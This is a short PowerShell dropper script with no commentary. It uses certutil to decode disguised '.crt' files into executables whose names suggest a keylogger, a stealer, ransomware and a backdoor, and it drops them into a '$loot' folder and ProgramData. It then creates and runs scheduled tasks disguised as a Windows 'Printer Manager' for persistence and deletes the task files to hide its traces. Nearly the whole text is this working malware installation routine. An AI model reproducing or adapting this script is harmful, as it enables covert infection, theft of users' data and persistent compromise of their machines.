
$loot = ($env:LOCALAPPDATA + "\dyna\"); md $loot
certutil -decode res.crt ($loot + "res"); certutil -decode kl.crt ($loot + "kl.exe"); certutil -decode st.crt ($loot + "st.exe");  certutil -decode cry.crt ($loot + "cry.exe"); certutil -decode t1.crt ($env:TEMP + "\t1.xml"); certutil -decode t2.crt ($env:TEMP + "\t2.xml"); certutil -decode t3.crt ($env:TEMP + "\t3.xml"); certutil -decode t4.crt ($env:TEMP + "\t4.xml"); certutil -decode t5.crt ($env:TEMP + "\t5.xml"); certutil -decode bd.crt C:\ProgramData\bd.exe
schtasks.exe /create /TN "Microsoft\Windows\Windows Printer Manager\1" /XML ($env:TEMP + "\t1.xml")
schtasks.exe /create /TN "Microsoft\Windows\Windows Printer Manager\2" /XML ($env:TEMP + "\t2.xml")
schtasks.exe /create /TN "Microsoft\Windows\Windows Printer Manager\3" /XML ($env:TEMP + "\t3.xml")
schtasks.exe /create /TN "Microsoft\Windows\Windows Printer Manager\4" /XML ($env:TEMP + "\t4.xml")
schtasks.exe /create /TN "Microsoft\Windows\Windows Printer Manager\5" /XML ($env:TEMP + "\t5.xml")
schtasks.exe /run /TN "Microsoft\Windows\Windows Printer Manager\1"
schtasks.exe /run /TN "Microsoft\Windows\Windows Printer Manager\2"
schtasks.exe /run /TN "Microsoft\Windows\Windows Printer Manager\3"
schtasks.exe /run /TN "Microsoft\Windows\Windows Printer Manager\4"
schtasks.exe /run /TN "Microsoft\Windows\Windows Printer Manager\5"
Remove-Item ($env:TEMP + "\*.xml") -Recurse -Force

